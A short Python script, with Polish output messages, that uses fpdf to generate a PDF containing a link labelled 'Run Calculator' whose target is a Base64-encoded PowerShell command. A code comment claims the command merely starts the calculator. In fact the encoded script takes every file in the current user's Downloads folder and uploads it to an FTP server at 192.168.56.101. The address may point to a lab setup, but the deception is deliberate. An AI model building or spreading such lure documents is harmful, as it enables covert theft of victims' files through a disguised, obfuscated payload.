import os
from fpdf import FPDF
from fpdf.enums import XPos, YPos

current_directory = os.getcwd()
print(f"Bieżący katalog roboczy: {current_directory}")


# Create instance of FPDF class
pdf = FPDF()

# Add a page to the PDF
pdf.add_page()

# Set font for the document (using standard font)
pdf.set_font("Helvetica", size=12)

# Add a clickable link with PowerShell code to open code (Base64 encoded)
base64_command = "JGZ0cFNlcnZlciA9ICJmdHA6Ly8xOTIuMTY4LjU2LjEwMSIKJHVzZXJuYW1lID0gW1N5c3RlbS5TZWN1cml0eS5QcmluY2lwYWwuV2luZG93c0lkZW50aXR5XTo6R2V0Q3VycmVudCgpLk5hbWUuU3BsaXQoJ1wnKVsxXQokbG9jYWxGb2xkZXIgPSAiQzpcVXNlcnNcJHVzZXJuYW1lXERvd25sb2FkcyIKJGNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQKJGNsaWVudC5DcmVkZW50aWFscyA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5OZXR3b3JrQ3JlZGVudGlhbCgiYW5vbnltb3VzIiwgImFub255bW91cyIpCgokZmlsZXMgPSBHZXQtQ2hpbGRJdGVtIC1QYXRoICRsb2NhbEZvbGRlcgoKZm9yZWFjaCAoJGZpbGUgaW4gJGZpbGVzKSB7CiAgICAkZnRwRmlsZVBhdGggPSAiJGZ0cFNlcnZlci91cGxvYWRzLyQoJGZpbGUuTmFtZSkiCiAgICAKICAgIHRyeSB7CiAgICAgICAgJGxvY2FsRmlsZVBhdGhXaXRoVXNlciA9ICIkbG9jYWxGb2xkZXJcJCgkZmlsZS5OYW1lKSIKICAgICAgICAkY2xpZW50LlVwbG9hZEZpbGUoJGZ0cEZpbGVQYXRoLCAiU1RPUiIsICRsb2NhbEZpbGVQYXRoV2l0aFVzZXIpCiAgICB9IGNhdGNoIHsKICAgICAgICAjdGVzdAogICAgfQp9"  # Base64 for "Start-Process calc"
pdf.cell(200, 10, text="Uruchom Kalkulator", new_x=XPos.LMARGIN, new_y=YPos.NEXT, link=f"powershell:{base64_command}")

pdf_output_path = os.path.join(current_directory, "powershell_calculator_link_example_3.pdf")
pdf.output(pdf_output_path)

print(f"Plik PDF został zapisany jako: {pdf_output_path}")

